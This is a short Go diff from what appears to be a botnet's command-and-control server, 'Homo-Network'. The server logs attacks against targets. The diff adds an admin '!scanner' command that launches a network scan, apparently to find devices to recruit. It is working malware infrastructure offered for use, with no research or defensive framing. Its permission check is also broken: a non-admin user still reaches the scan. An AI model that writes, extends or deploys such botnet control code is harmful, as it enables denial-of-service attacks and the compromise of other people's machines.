@@ -129,6 +129,14 @@ func CommandManager(conn net.Conn) {
 		Log("🚀 New attack||Target: " + cmd[1] + "||Login: " + s.Login + "||IP: " + s.Ip + "*")
 		fmt.Println(color.GreenString("\n[!] New attack\nTarget: " + cmd[1] + "\nLogin: " + s.Login + "\nIP: " + s.Ip))
 		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
+
+	} else if strings.HasPrefix(string(line), "!scanner") {
+		if s.Login != config.GetConfig().Cnc.AdmLogin {
+			Print(gradient.Rainbow().Apply("Unknown command\n"), conn)
+			CommandManager(conn)
+		}
+		go server.Scan()
+		Print(gradient.Rainbow().Apply("[Homo-Network] ")+color.HiWhiteString("Command successfully sent\n"), conn)
 	} else if strings.HasPrefix(string(line), "help") || strings.HasPrefix(string(line), "methods") {
 
 		conn.Write([]byte("\n"))
